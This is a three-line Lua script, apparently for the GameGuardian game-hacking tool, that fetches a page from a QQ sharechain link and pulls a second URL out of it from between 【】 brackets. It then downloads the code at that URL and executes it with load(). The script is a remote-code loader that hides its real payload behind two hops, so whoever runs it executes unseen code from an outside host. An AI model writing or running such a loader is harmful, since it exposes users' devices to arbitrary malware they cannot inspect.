local HQ=gg.makeRequest("https://sharechain.qq.com/948e102dbddcbb3d87bc0e15321ebc68").content
local LJ=gg.makeRequest(HQ:match("【(.-)】")).content
pcall(load(LJ)())